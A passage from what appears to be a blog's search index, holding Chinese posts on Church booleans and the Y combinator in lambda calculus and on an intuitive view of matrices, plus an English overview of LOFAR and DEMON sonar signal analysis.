丘齐数对编程有什么用嗫？俺还真不知道。但丘齐数（进而到丘齐编码）确实一系列基础理论中有重要应用，比如说有类型的lambda算子。不过这点重要吗？不重要吗？重要吗？不重要吗？研究研究嘛。 ※lamdba算子4：布尔值和选择 ※Lambda算子里的布尔值和选择 原文在这里。既然Lambda算子里有了数的概念，我们想进行任意的计算就只需要两件东西了：怎么表示选择，和怎么表达重复操作。我们先聊聊怎么表示布尔值（也就是非真即假的二元集合）和选择，然后再讨论重复和递归（友情预告：人见人爱的Y Combinator终于可以出场了）。 我们一般把选择表示为if/then/else的表达式，和大多数编程语言的选择语句没有区别。丘齐数的基本模式无非是把一个数表达为一个函数。这个函数把它自己加到另外一个函数上。我们继续沿用这个模式，把true和false也表达为对自己的参数执行if-then-else操作的函数： let TRUE = lambda x y . x let FALSE = lambda x y . y 现在我们就可以写“if-then-else”函数了（记到哈，lambda算子理论里所有东东都是函数）。这个函数的第一个参数是一个条件表达式，第二个参数是当第一个参数为真时返回的表达式，而第三个参数自然是当第一个参数为假时返回的表达式了。相当于我们的if cond then true_expr else false_expr: let IfThenElse = lambda cond true_expr false_expr . cond true_expr false_expr 为了我们刚定义的布尔值有用，我们还得定义一些常用的逻辑操作先： let BoolAnd = lambda x y . x y FALSE let BoolOr = lambda x y. x TRUE y let BoolNot = lambda x . x FALSE TRUE 上面定义了常用的“与”，“或”，和“非”操作。我们可以稍微考查一下它们的机制。 BoolAnd TRUE FALSE （也就是 true &amp;&amp; false)： 我们把TRUE和FALSE替换为它们的定义: BoolAnd (lambda x y . x) (lambda x y . y) 执行Alpha 替换避免混淆变量名：BoolAnd （lambda xt yt . xt) (lambda xf yf . yf)然后把BoolAnd替换为它的定义：（lambda x y . x y FALSE）(lambda xt yt . xt) (lambda xf yf . yf)执行Beta替换：(lambda xt yt . xt) (lambda xf yf . yf) FALSE呵呵，再Beta一把：(lambda xf yf . yf)。 最后的结果lambda xf yf . yf就是FALSE的定义。也就是说， BoolAnd TRUE FALSE = FALSE。神奇吧？看起来只是简单的替换：变量替换，参数替换，但最后的结果确意义重大。这让我想起当年第一次读GEB时不由自主地感叹，看似简单的句法层面的操作竟然能得出迷幻般的结果。 我们再来看看 false &amp;&amp; true, 也就是 BoolAnd FALSE TRUE。“噫，那不是和我们刚推演过的BoolAnd TRUE FALSE一样么！”。眼尖的老大们可能要问。嗯，我们知道布尔逻辑里的操作是服从交换率的，所以 a &amp;&amp; b 等于 b &amp;&amp; a。可惜我们在用lambda算子定义布尔操作，是不是服从交换率，需要我们证明。如果BoolAnd FALSE TRUE的结果是FALSE，我们也就证明了BoolAnd符合交换率：定义替换：BoolAnd (lambda x y . y) (lambda x y .x) Alpha替换: BoolAnd (lambda xf yf . yf) (lambda xt yt . xt) 替换BoolAnd的定义: (lambda x y .x y FALSE) (lambda xf yf . yf) (lambda xt yt . xt) Beta替换: (lambda xf yf . yf) (lambda xt yt . xt) FALSE 再来Beta替换: lambda xt yt. xt, 也就是FALSE 所以说， BoolAnd FALSE TRUE = FALSE 最后，我们来看看BoolAnd TRUE TRUE: 定义替换：BoolAnd (lambda x y . x) (lambda x y . x) Alpha替换: BoolAnd (lambda xa ya . xa) (lambda xb yb . xb) 替换BoolAnd的定义: (lambda x y . x y FALSE) (lambda xa ya . xa) (lambda xb yb . xb) Beta替换: (lambda xa ya . xa) (lambda xb yb . xb) FALSE 再次Beta替换: (lambda xb yb .xb)，这个正是TRUE的定义所以我们得到BoolAnd TRUE TRUE = TRUE ※Lambda算子5b：How of Y 其实是 这篇文章的意译。有些东西省了。添了点私货。就有了下面的帖子。虽然Y相当神奇。对它的推导也不完全是天外飞仙般无迹可寻。基本上我们为了解决让没有名字的函数能自我引用，一步一步抽象出了Y。所以知道Y的推导过程对我们程序员还是很有意义的：毕竟编程的过程也是抽象的过程。看看当年的老大们怎么从纷繁的表象里抽象出一般规律，对我们日后的思考应该大有好处。为了老大们能够试验，我就用JavaScript了。整个推导的过程非常像编程时的重构。我们提出一个粗略的解决方案，然后仔细观察，找出可以抽象的地方，进行抽象。得到一个更普适的结果后，继续重复重构的步骤，直到得到最优解。估计看这篇帖子的人都知道怎么玩儿小小JavaScript吧？再说有个浏览器就有了测试环境。废话少说，看代码。我们还是以阶乘函数为例。先看通常的写法： 123456789function fact(n)&#123; if(n == 0)&#123; return 1; &#125; if(n &gt; 0)&#123; return n * fact(n - 1); &#125;&#125; 上面的JavaScript函数定义内部调用自己。这种调用可行的前提是我们用函数名指代函数定义。也就是说， fact这个名字绑定的函数定义就是上面的函数体。如果我们不能通过名字来调用函数怎么办呢（就跟lambda算子一样）？也许有老大会问：为什么增加这个限制呢？不是自虐么？理由很简单：理论需要探求事物本质。记得奥卡姆剃刀吧？如无必要，毋增实体。函数名到底是必需元素，还是句法糖？这种研究方法也有实际的意义：再复杂的系统也是在简单但完备的基础上搭建起来的。强大的编程工具，总是基于于层层叠加的抽象，而最低级的抽象层总是非常简单。简单意味着透彻，简单意味着健壮。简单意味着灵活。简单意味着经济。问题是，到底简单到什么地步？怎么保证系统不至于简单到一无所用的地步？这和逻辑学家建立系统时总是要证明系统的正确性和完备性一个道理。而找到了Y，我们也就明白了，原来函数名绑定并非本质。 嗯，继续。函数 fact是递归的基本形式。既然我们不能直接在函数体内通过函数名调用另一个函数，我们至少可以把想调用的函数通过参数传进去。","tags":""},{"title":"理解矩阵","url":"/20240428/li-jie-ju-zhen/","text":"转载自 理解矩阵 “我认为，这是我们的线性代数教学中直觉性丧失的后果。上述这些涉及到“如何能”、“怎么会”的问题，仅仅通过纯粹的数学证明来回答，是不能令提问者满意的。比如，如果你通过一般的证明方法论证了矩阵分块运算确实可行，那么这并不能够让提问者的疑惑得到解决。他们真正的困惑是：矩阵分块运算为什么竟然是可行的？究竟只是凑巧，还是说这是由矩阵这种对象的某种本质所必然决定的？如果是后者，那么矩阵的这些本质是什么？只要对上述那些问题稍加考虑，我们就会发现，所有这些问题都不是单纯依靠数学证明所能够解决的。像我们的教科书那样，凡事用数学证明，最后培养出来的学生，只能熟练地使用工具，却欠缺真正意义上的理解。 自从1930年代法国布尔巴基学派兴起以来，数学的公理化、系统性描述已经获得巨大的成功，这使得我们接受的数学教育在严谨性上大大提高。然而数学公理化的一个备受争议的副作用，就是一般数学教育中直觉性的丧失。数学家们似乎认为直觉性与抽象性是矛盾的，因此毫不犹豫地牺牲掉前者。然而包括我本人在内的很多人都对此表示怀疑，我们不认为直觉性与抽象性一定相互矛盾，特别是在数学教育中和数学教材中，帮助学生建立直觉，有助于它们理解那些抽象的概念，进而理解数学的本质。反之，如果一味注重形式上的严格性，学生就好像被迫进行钻火圈表演的小白鼠一样，变成枯燥的规则的奴隶。 对于线性代数的类似上述所提到的一些直觉性的问题，两年多来我断断续续地反复思考了四、五次，为此阅读了好几本国内外线性代数、数值分析、代数和数学通论性书籍，其中像前苏联的名著《数学：它的内容、方法和意义》、龚昇教授的《线性代数五讲》、前面提到的Encounter with Mathematics（《数学概观》）以及Thomas A. Garrity的《数学拾遗》都给我很大的启发。不过即使如此，我对这个主题的认识也经历了好几次自我否定。比如以前思考的一些结论曾经写在自己的blog里，但是现在看来，这些结论基本上都是错误的。因此打算把自己现在的有关理解比较完整地记录下来，一方面是因为我觉得现在的理解比较成熟了，可以拿出来与别人探讨，向别人请教。另一方面，如果以后再有进一步的认识，把现在的理解给推翻了，那现在写的这个snapshot也是很有意义的。” 首先说说空间(space)，这个概念是现代数学的命根子之一，从拓扑空间开始，一步步往上加定义，可以形成很多空间。线形空间其实还是比较初级的，如果在里面定义了范数，就成了赋范线性空间。赋范线性空间满足完备性，就成了巴那赫空间；赋范线性空间中定义角度，就有了内积空间，内积空间再满足完备性，就得到希尔伯特空间。 总之，空间有很多种。你要是去看某种空间的数学定义，大致都是“存在一个集合，在这个集合上定义某某概念，然后满足某些性质”，就可以被称为空间。这未免有点奇怪，为什么要用“空间”来称呼一些这样的集合呢？大家将会看到，其实这是很有道理的。 我们一般人最熟悉的空间，毫无疑问就是我们生活在其中的（按照牛顿的绝对时空观）的三维空间，从数学上说，这是一个三维的欧几里德空间，我们先不管那么多，先看看我们熟悉的这样一个空间有些什么最基本的特点。仔细想想我们就会知道，这个三维的空间：1. 由很多（实际上是无穷多个）位置点组成；2. 这些点之间存在相对的关系；3. 可以在空间中定义长度、角度；4. 这个空间可以容纳运动，这里我们所说的运动是从一个点到另一个点的移动（变换），而不是微积分意义上的“连续”性的运动， 上面的这些性质中，最最关键的是第4条。第1、2条只能说是空间的基础，不算是空间特有的性质，凡是讨论数学问题，都得有一个集合，大多数还得在这个集合上定义一些结构（关系），并不是说有了这些就算是空间。而第3条太特殊，其他的空间不需要具备，更不是关键的性质。只有第4条是空间的本质，也就是说，容纳运动是空间的本质特征。 认识到了这些，我们就可以把我们关于三维空间的认识扩展到其他的空间。事实上，不管是什么空间，都必须容纳和支持在其中发生的符合规则的运动（变换）。你会发现，在某种空间中往往会存在一种相对应的变换，比如拓扑空间中有拓扑变换，线性空间中有线性变换，仿射空间中有仿射变换，其实这些变换都只不过是对应空间中允许的运动形式而已。 因此只要知道，“空间”是容纳运动的一个对象集合，而变换则规定了对应空间的运动。 下面我们来看看线性空间。线性空间的定义任何一本书上都有，但是既然我们承认线性空间是个空间，那么有两个最基本的问题必须首先得到解决，那就是： 空间是一个对象集合，线性空间也是空间，所以也是一个对象集合。那么线性空间是什么样的对象的集合？或者说，线性空间中的对象有什么共同点吗？ 线性空间中的运动如何表述的？也就是，线性变换是如何表示的？ 我们先来回答第一个问题，回答这个问题的时候其实是不用拐弯抹角的，可以直截了当的给出答案。线性空间中的任何一个对象，通过选取基和坐标的办法，都可以表达为向量的形式。通常的向量空间我就不说了，举两个不那么平凡的例子： L1. 最高次项不大于n次的多项式的全体构成一个线性空间，也就是说，这个线性空间中的每一个对象是一个多项式。如果我们以x0, x1, …, xn为基，那么任何一个这样的多项式都可以表达为一组n+1维向量，其中的每一个分量ai其实就是多项式中x(i-1)项的系数。值得说明的是，基的选取有多种办法，只要所选取的那一组基线性无关就可以。这要用到后面提到的概念了，所以这里先不说，提一下而已。 L2. 闭区间[a,b]上的n阶连续可微函数的全体，构成一个线性空间。也就是说，这个线性空间的每一个对象是一个连续函数。对于其中任何一个连续函数，根据魏尔斯特拉斯定理，一定可以找到最高次项不大于n的多项式函数，使之与该连续函数的差为0，也就是说，完全相等。这样就把问题归结为L1了。后面就不用再重复了。 所以说，向量是很厉害的，只要你找到合适的基，用向量可以表示线性空间里任何一个对象。这里头大有文章，因为向量表面上只是一列数，但是其实由于它的有序性，所以除了这些数本身携带的信息之外，还可以在每个数的对应位置上携带信息。为什么在程序设计中数组最简单，却又威力无穷呢？根本原因就在于此。这是另一个问题了，这里就不说了。 下面来回答第二个问题，这个问题的回答会涉及到线性代数的一个最根本的问题。 线性空间中的运动，被称为线性变换。也就是说，你从线性空间中的一个点运动到任意的另外一个点，都可以通过一个线性变化来完成。那么，线性变换如何表示呢？很有意思，在线性空间中，当你选定一组基之后，不仅可以用一个向量来描述空间中的任何一个对象，而且可以用矩阵来描述该空间中的任何一个运动（变换）。而使某个对象发生对应运动的方法，就是用代表那个运动的矩阵，乘以代表那个对象的向量。 简而言之，在线性空间中选定基之后，向量刻画对象，矩阵刻画对象的运动，用矩阵与向量的乘法施加运动。 是的，矩阵的本质是运动的描述。如果以后有人问你矩阵是什么，那么你就可以响亮地告诉他，矩阵的本质是运动的描述。 可是多么有意思啊，向量本身不是也可以看成是n x 1矩阵吗？这实在是很奇妙，一个空间中的对象和运动竟然可以用相类同的方式表示。能说这是巧合吗？如果是巧合的话，那可真是幸运的巧合！可以说，线性代数中大多数奇妙的性质，均与这个巧合有直接的关系。 上一篇里说“矩阵是运动的描述”，到现在为止，好像大家都还没什么意见。但是我相信早晚会有数学系出身的网友来拍板转。因为运动这个概念，在数学和物理里是跟微积分联系在一起的。我们学习微积分的时候，总会有人照本宣科地告诉你，初等数学是研究常量的数学，是研究静态的数学，高等数学是变量的数学，是研究运动的数学。大家口口相传，差不多人人都知道这句话。但是真知道这句话说的是什么意思的人，好像也不多。简而言之，在我们人类的经验里，运动是一个连续过程，从A点到B点，就算走得最快的光，也是需要一个时间来逐点地经过AB之间的路径，这就带来了连续性的概念。而连续这个事情，如果不定义极限的概念，根本就解释不了。古希腊人的数学非常强，但就是缺乏极限观念，所以解释不了运动，被芝诺的那些著名悖论（飞箭不动、飞毛腿阿喀琉斯跑不过乌龟等四个悖论）搞得死去活来。因为这篇文章不是讲微积分的，所以我就不多说了。有兴趣的读者可以去看看齐民友教授写的《重温微积分》。我就是读了这本书开头的部分，才明白“高等数学是研究运动的数学”这句话的道理。 不过在我这个《理解矩阵》的文章里，“运动”的概念不是微积分中的连续性的运动，而是瞬间发生的变化。比如这个时刻在A点，经过一个“运动”，一下子就“跃迁”到了B点，其中不需要经过A点与B点之间的任何一个点。这样的“运动”，或者说“跃迁”，是违反我们日常的经验的。不过了解一点量子物理常识的人，就会立刻指出，量子（例如电子）在不同的能量级轨道上跳跃，就是瞬间发生的，具有这样一种跃迁行为。所以说，自然界中并不是没有这种运动现象，只不过宏观上我们观察不到。但是不管怎么说，“运动”这个词用在这里，还是容易产生歧义的，说得更确切些，应该是“跃迁”。因此这句话可以改成： “矩阵是线性空间里跃迁的描述”。 可是这样说又太物理，也就是说太具体，而不够数学，也就是说不够抽象。因此我们最后换用一个正牌的数学术语——变换，来描述这个事情。这样一说，大家就应该明白了，所谓变换，其实就是空间里从一个点（元素/对象）到另一个点（元素/对象）的跃迁。比如说，拓扑变换，就是在拓扑空间里从一个点到另一个点的跃迁。再比如说，仿射变换，就是在仿射空间里从一个点到另一个点的跃迁。附带说一下，这个仿射空间跟向量空间是亲兄弟。做计算机图形学的朋友都知道，尽管描述一个三维对象只需要三维向量，但所有的计算机图形学变换矩阵都是4 x 4的。说其原因，很多书上都写着“为了使用中方便”，这在我看来简直就是企图蒙混过关。真正的原因，是因为在计算机图形学里应用的图形变换，实际上是在仿射空间而不是向量空间中进行的。想想看，在向量空间里相一个向量平行移动以后仍是相同的那个向量，而现实世界等长的两个平行线段当然不能被认为同一个东西，所以计算机图形学的生存空间实际上是仿射空间。而仿射变换的矩阵表示根本就是4 x 4的。又扯远了，有兴趣的读者可以去看《计算机图形学——几何工具算法详解》。 一旦我们理解了“变换”这个概念，矩阵的定义就变成： “矩阵是线性空间里的变换的描述。” 到这里为止，我们终于得到了一个看上去比较数学的定义。不过还要多说几句。教材上一般是这么说的，在一个线性空间V里的一个线性变换T，当选定一组基之后，就可以表示为矩阵。因此我们还要说清楚到底什么是线性变换，什么是基，什么叫选定一组基。线性变换的定义是很简单的，设有一种变换T，使得对于线性空间V中间任何两个不相同的对象x和y，以及任意实数a和b，有： T(ax + by) = aT(x) + bT(y)，那么就称T为线性变换。 定义都是这么写的，但是光看定义还得不到直觉的理解。线性变换究竟是一种什么样的变换？我们刚才说了，变换是从空间的一个点跃迁到另一个点，而线性变换，就是从一个线性空间V的某一个点跃迁到另一个线性空间W的另一个点的运动。这句话里蕴含着一层意思，就是说一个点不仅可以变换到同一个线性空间中的另一个点，而且可以变换到另一个线性空间中的另一个点去。不管你怎么变，只要变换前后都是线性空间中的对象，这个变换就一定是线性变换，也就一定可以用一个非奇异矩阵来描述。而你用一个非奇异矩阵去描述的一个变换，一定是一个线性变换。有的人可能要问，这里为什么要强调非奇异矩阵？所谓非奇异，只对方阵有意义，那么非方阵的情况怎么样？这个说起来就会比较冗长了，最后要把线性变换作为一种映射，并且讨论其映射性质，以及线性变换的核与像等概念才能彻底讲清楚。我觉得这个不算是重点，如果确实有时间的话，以后写一点。以下我们只探讨最常用、最有用的一种变换，就是在同一个线性空间之内的线性变换。也就是说，下面所说的矩阵，不作说明的话，就是方阵，而且是非奇异方阵。学习一门学问，最重要的是把握主干内容，迅速建立对于这门学问的整体概念，不必一开始就考虑所有的细枝末节和特殊情况，自乱阵脚。 接着往下说，什么是基呢？这个问题在后面还要大讲一番，这里只要把基看成是线性空间里的坐标系就可以了。注意是坐标系，不是坐标值，这两者可是一个“对立矛盾统一体”。这样一来，“选定一组基”就是说在线性空间里选定一个坐标系。就这意思。 好，最后我们把矩阵的定义完善如下： “矩阵是线性空间中的线性变换的一个描述。在一个线性空间中，只要我们选定一组基，那么对于任何一个线性变换，都能够用一个确定的矩阵来加以描述。” 理解这句话的关键，在于把“线性变换”与“线性变换的一个描述”区别开。一个是那个对象，一个是对那个对象的表述。就好像我们熟悉的面向对象编程中，一个对象可以有多个引用，每个引用可以叫不同的名字，但都是指的同一个对象。如果还不形象，那就干脆来个很俗的类比。 比如有一头猪，你打算给它拍照片，只要你给照相机选定了一个镜头位置，那么就可以给这头猪拍一张照片。这个照片可以看成是这头猪的一个描述，但只是一个片面的的描述，因为换一个镜头位置给这头猪拍照，能得到一张不同的照片，也是这头猪的另一个片面的描述。所有这样照出来的照片都是这同一头猪的描述，但是又都不是这头猪本身。 同样的，对于一个线性变换，只要你选定一组基，那么就可以找到一个矩阵来描述这个线性变换。换一组基，就得到一个不同的矩阵。所有这些矩阵都是这同一个线性变换的描述，但又都不是线性变换本身。 但是这样的话，问题就来了如果你给我两张猪的照片，我怎么知道这两张照片上的是同一头猪呢？同样的，你给我两个矩阵，我怎么知道这两个矩阵是描述的同一个线性变换呢？如果是同一个线性变换的不同的矩阵描述，那就是本家兄弟了，见面不认识，岂不成了笑话。 好在，我们可以找到同一个线性变换的矩阵兄弟们的一个性质，那就是： 若矩阵A与B是同一个线性变换的两个不同的描述（之所以会不同，是因为选定了不同的基，也就是选定了不同的坐标系），则一定能找到一个非奇异矩阵P，使得A、B之间满足这样的关系： A = P-1BP 线性代数稍微熟一点的读者一下就看出来，这就是相似矩阵的定义。没错，所谓相似矩阵，就是同一个线性变换的不同的描述矩阵。按照这个定义，同一头猪的不同角度的照片也可以成为相似照片。俗了一点，不过能让人明白。 而在上面式子里那个矩阵P，其实就是A矩阵所基于的基与B矩阵所基于的基这两组基之间的一个变换关系。关于这个结论，可以用一种非常直觉的方法来证明（而不是一般教科书上那种形式上的证明），如果有时间的话，我以后在blog里补充这个证明。 这个发现太重要了。原来一族相似矩阵都是同一个线性变换的描述啊！难怪这么重要！工科研究生课程中有矩阵论、矩阵分析等课程，其中讲了各种各样的相似变换，比如什么相似标准型，对角化之类的内容，都要求变换以后得到的那个矩阵与先前的那个矩阵式相似的，为什么这么要求？因为只有这样要求，才能保证变换前后的两个矩阵是描述同一个线性变换的。当然，同一个线性变换的不同矩阵描述，从实际运算性质来看并不是不分好环的。有些描述矩阵就比其他的矩阵性质好得多。这很容易理解，同一头猪的照片也有美丑之分嘛。所以矩阵的相似变换可以把一个比较丑的矩阵变成一个比较美的矩阵，而保证这两个矩阵都是描述了同一个线性变换。 这样一来，矩阵作为线性变换描述的一面，基本上说清楚了。但是，事情没有那么简单，或者说，线性代数还有比这更奇妙的性质，那就是，矩阵不仅可以作为线性变换的描述，而且可以作为一组基的描述。而作为变换的矩阵，不但可以把线性空间中的一个点给变换到另一个点去，而且也能够把线性空间中的一个坐标系（基）表换到另一个坐标系（基）去。而且，变换点与变换坐标系，具有异曲同工的效果。线性代数里最有趣的奥妙，就蕴含在其中。理解了这些内容，线性代数里很多定理和规则会变得更加清晰、直觉。 首先来总结一下前面两部分的一些主要结论： 首先有空间，空间可以容纳对象运动的。一种空间对应一类对象。 有一种空间叫线性空间，线性空间是容纳向量对象运动的。 运动是瞬时的，因此也被称为变换。 矩阵是线性空间中运动（变换）的描述。 矩阵与向量相乘，就是实施运动（变换）的过程。 同一个变换，在不同的坐标系下表现为不同的矩阵，但是它们的本质是一样的，所以本征值相同。 下面让我们把视力集中到一点以改变我们以往看待矩阵的方式。我们知道，线性空间里的基本对象是向量，而向量是这么表示的： [a1, a2, a3, …, an] 矩阵呢？矩阵是这么表示的： a11, a12, a13, …, a1n a21, a22, a23, …, a2n … an1, an2, an3, …, ann 不用太聪明，我们就能看出来，矩阵是一组向量组成的。特别的，n维线性空间里的方阵是由n个n维向量组成的。我们在这里只讨论这个n阶的、非奇异的方阵，因为理解它就是理解矩阵的关键，它才是一般情况，而其他矩阵都是意外，都是不得不对付的讨厌状况，大可以放在一边。这里多一句嘴，学习东西要抓住主流，不要纠缠于旁支末节。很可惜我们的教材课本大多数都是把主线埋没在细节中的，搞得大家还没明白怎么回事就先被灌晕了。比如数学分析，明明最要紧的观念是说，一个对象可以表达为无穷多个合理选择的对象的线性和，这个概念是贯穿始终的，也是数学分析的精华。但是课本里自始至终不讲这句话，反正就是让你做吉米多维奇，掌握一大堆解偏题的技巧，记住各种特殊情况，两类间断点，怪异的可微和可积条件（谁还记得柯西条件、迪里赫莱条件…？），最后考试一过，一切忘光光。要我说，还不如反复强调这一个事情，把它深深刻在脑子里，别的东西忘了就忘了，真碰到问题了，再查数学手册嘛，何必因小失大呢？ 言归正传。如果一组向量是彼此线性无关的话，那么它们就可以成为度量这个线性空间的一组基，从而事实上成为一个坐标系体系，其中每一个向量都躺在一根坐标轴上，并且成为那根坐标轴上的基本度量单位（长度1）。 现在到了关键的一步。看上去矩阵就是由一组向量组成的，而且如果矩阵非奇异的话（我说了，只考虑这种情况），那么组成这个矩阵的那一组向量也就是线性无关的了，也就可以成为度量线性空间的一个坐标系。结论：矩阵描述了一个坐标系。 “慢着！”，你嚷嚷起来了，“你这个骗子！你不是说过，矩阵就是运动吗？怎么这会矩阵又是坐标系了？” 嗯，所以我说到了关键的一步。我并没有骗人，之所以矩阵又是运动，又是坐标系，那是因为—— “运动等价于坐标系变换”。 对不起，这话其实不准确，我只是想让你印象深刻。准确的说法是： “对象的变换等价于坐标系的变换”。 或者： “固定坐标系下一个对象的变换等价于固定对象所处的坐标系变换。” 说白了就是： “运动是相对的。” 让我们想想，达成同一个变换的结果，比如把点(1, 1)变到点(2, 3)去，你可以有两种做法。第一，坐标系不动，点动，把(1, 1)点挪到(2, 3)去。第二，点不动，变坐标系，让x轴的度量（单位向量）变成原来的1/2，让y轴的度量（单位向量）变成原先的1/3，这样点还是那个点，可是点的坐标就变成(2, 3)了。方式不同，结果一样。 从第一个方式来看，那就是我在《理解矩阵》1/2中说的，把矩阵看成是运动描述，矩阵与向量相乘就是使向量（点）运动的过程。在这个方式下， Ma = b 的意思是： “向量a经过矩阵M所描述的变换，变成了向量b。” 而从第二个方式来看，矩阵M描述了一个坐标系，姑且也称之为M。那么： Ma = b 的意思是： “有一个向量，它在坐标系M的度量下得到的度量结果向量为a，那么它在坐标系I的度量下，这个向量的度量结果是b。” 这里的I是指单位矩阵，就是主对角线是1，其他为零的矩阵。 而这两个方式本质上是等价的。 我希望你务必理解这一点，因为这是本篇的关键。 正因为是关键，所以我得再解释一下。 在M为坐标系的意义下，如果把M放在一个向量a的前面，形成Ma的样式，我们可以认为这是对向量a的一个环境声明。它相当于是说： “注意了！这里有一个向量，它在坐标系M中度量，得到的度量结果可以表达为a。可是它在别的坐标系里度量的话，就会得到不同的结果。为了明确，我把M放在前面，让你明白，这是该向量在坐标系M中度量的结果。” 那么我们再看孤零零的向量b：b 多看几遍，你没看出来吗？它其实不是b，它是：Ib 也就是说：“在单位坐标系，也就是我们通常说的直角坐标系I中，有一个向量，度量的结果是b。” 而 Ma = Ib的意思就是说： “在M坐标系里量出来的向量a，跟在I坐标系里量出来的向量b，其实根本就是一个向量啊！” 这哪里是什么乘法计算，根本就是身份识别嘛。 从这个意义上我们重新理解一下向量。向量这个东西客观存在，但是要把它表示出来，就要把它放在一个坐标系中去度量它，然后把度量的结果（向量在各个坐标轴上的投影值）按一定顺序列在一起，就成了我们平时所见的向量表示形式。你选择的坐标系（基）不同，得出来的向量的表示就不同。向量还是那个向量，选择的坐标系不同，其表示方式就不同。因此，按道理来说，每写出一个向量的表示，都应该声明一下这个表示是在哪个坐标系中度量出来的。表示的方式，就是 Ma，也就是说，有一个向量，在M矩阵表示的坐标系中度量出来的结果为a。我们平时说一个向量是[2 3 5 7]T，隐含着是说，这个向量在 I 坐标系中的度量结果是[2 3 5 7]T，因此，这个形式反而是一种简化了的特殊情况。 注意到，M矩阵表示出来的那个坐标系，由一组基组成，而那组基也是由向量组成的，同样存在这组向量是在哪个坐标系下度量而成的问题。也就是说，表述一个矩阵的一般方法，也应该要指明其所处的基准坐标系。所谓M，其实是 IM，也就是说，M中那组基的度量是在 I 坐标系中得出的。从这个视角来看，M×N也不是什么矩阵乘法了，而是声明了一个在M坐标系中量出的另一个坐标系N，其中M本身是在I坐标系中度量出来的。 回过头来说变换的问题。我刚才说，“固定坐标系下一个对象的变换等价于固定对象所处的坐标系变换”，那个“固定对象”我们找到了，就是那个向量。但是坐标系的变换呢？我怎么没看见？ 请看： Ma = Ib 我现在要变M为I，怎么变？对了，再前面乘以个M-1，也就是M的逆矩阵。换句话说，你不是有一个坐标系M吗，现在我让它乘以个M-1，变成I，这样一来的话，原来M坐标系中的a在I中一量，就得到b了。 我建议你此时此刻拿起纸笔，画画图，求得对这件事情的理解。比如，你画一个坐标系，x轴上的衡量单位是2，y轴上的衡量单位是3，在这样一个坐标系里，坐标为(1，1)的那一点，实际上就是笛卡尔坐标系里的点(2, 3)。而让它原形毕露的办法，就是把原来那个坐标系: 2 0 0 3 的x方向度量缩小为原来的1/2，而y方向度量缩小为原来的1/3，这样一来坐标系就变成单位坐标系I了。保持点不变，那个向量现在就变成了(2, 3)了。 怎么能够让“x方向度量缩小为原来的1/2，而y方向度量缩小为原来的1/3”呢？就是让原坐标系： 2 0 0 3 被矩阵： 1/2 0 0 1/3 左乘。而这个矩阵就是原矩阵的逆矩阵。 下面我们得出一个重要的结论： “对坐标系施加变换的方法，就是让表示那个坐标系的矩阵与表示那个变化的矩阵相乘。” 再一次的，矩阵的乘法变成了运动的施加。只不过，被施加运动的不再是向量，而是另一个坐标系。 如果你觉得你还搞得清楚，请再想一下刚才已经提到的结论，矩阵MxN，一方面表明坐标系N在运动M下的变换结果，另一方面，把M当成N的前缀，当成N的环境描述，那么就是说，在M坐标系度量下，有另一个坐标系N。这个坐标系N如果放在I坐标系中度量，其结果为坐标系MxN。 在这里，我实际上已经回答了一般人在学习线性代数是最困惑的一个问题，那就是为什么矩阵的乘法要规定成这样。简单地说，是因为： 从变换的观点看，对坐标系N施加M变换，就是把组成坐标系N的每一个向量施加M变换。 从坐标系的观点看，在M坐标系中表现为N的另一个坐标系，这也归结为，对N坐标系基的每一个向量，把它在I坐标系中的坐标找出来，然后汇成一个新的矩阵。 至于矩阵乘以向量为什么要那样规定，那是因为一个在M中度量为a的向量，如果想要恢复在I中的真像，就必须分别与M中的每一个向量进行內积运算。我把这个结论的推导留给感兴趣的朋友吧。应该说，其实到了这一步，已经很容易了。 综合以上1/2/3，矩阵的乘法就得那么规定，一切有根有据，绝不是哪个神经病胡思乱想出来的。 我已经无法说得更多了。矩阵又是坐标系，又是变换。到底是坐标系，还是变换，已经说不清楚了，运动与实体在这里统一了，物质与意识的界限已经消失了，一切归于无法言说，无法定义了。道可道，非常道，名可名，非常名。矩阵是在是不可道之道，不可名之名的东西。到了这个时候，我们不得不承认，我们伟大的线性代数课本上说的矩阵定义，是无比正确的： “矩阵就是由m行n列数放在一起组成的数学对象。” 好了，这基本上就是我想说的全部了。还留下一个行列式的问题。矩阵M的行列式实际上是组成M的各个向量按照平行四边形法则搭成一个n维立方体的体积。对于这一点，我只能感叹于其精妙，却无法揭开其中奥秘了。也许我掌握的数学工具不够，我希望有人能够给我们大家讲解其中的道理了。","tags":""},{"title":"LOFAR and DEMON analysis: technical description","url":"/20240410/lofar-and-demon-analysis-technical-description/","text":"LOFAR and DEMON analysis: technical description LOFAR analysis can be considered as a broadband spectral analysis covering the expected range of the controlled object noise. The sequence of LOFAR analysis is as follows: election of direction of interest (also referred to as “bearing”); Processing of the incoming signal with Hanning window; Further processing of the resulting signal with the Fast Fourier Transform (the FFT processing is used in order to obtain signal representation in the particular frequency domain). Signal normalization by means of implementing a task-specific algorithm. This stage of the target signal processing is intended for overall signal normalization, evaluation of the background noise level, signal bias removal, and peak equalization. DEMON analysis is a narrowband analysis used for cavitation noise processing with further accumulation of data obtained from the controlled object. In terms of practical implementation, DEMON analysis allows to separate the cavitation noise from the overall signal spectrum and to estimate the number of shafts, their rotation frequency, and blade rate. Since this analysis provides a comprehensive information on the target propellers, it is also quite useful for target detection purposes. The sequence of DEMON analysis is as follows: Selection of direction of interest (also referred to as “bearing”); Further bandpass filtering. It is implemented in order to reduce the cavitation frequency range of the overall signal; Squaring of the signal (by means of a standard demodulation algorithm); The next step of signal processing is the implementation of normalization algorithm (it is used to reduce the background noise level as well as to emphasize the target signal peaks); The final stage of the target signal processing is the use of a short-time Fast Fourier Transform (it allows to observe signal peaks in the frequency domain). DEMON-type analysis algorithms (also sometimes referred to as “pattern-recognition methods”) are also implemented within the framework of acoustic signatures detection and classification. Among the reasons for growing popularity of this method, one should mention the fact, that active acoustic detection systems have a number of undesirable side effects negatively affecting both environment and navigation. Acoustic signature identification and classification method is nowadays widely applicable in various civil and scientific systems deployed in littoral and shore areas. In the case of a vessel, the main acoustic noises are produced by engines, the hydrodynamic flow of the hull and the propeller motion. These types of vessel noise also tend to have various profiles depending on the vessel engine type, propeller blades rotation frequency and blades number, propeller depth, fatigue changes of the engine, propeller blades and vessel mechanisms.","tags":""},{"title":"无人水面艇国内外现状","url":"/20240408/wu-ren-shui-mian-ting-guo-nei-wai-xian-zhuang/","text":"转载自 无人水面艇国内外现状 本文节选自：海上无人装备体系概览/ 董晓明主编. — 哈尔滨: 哈尔滨工程大学出版社，2020.1（国之重器出版工程） ※1、国外发展现状 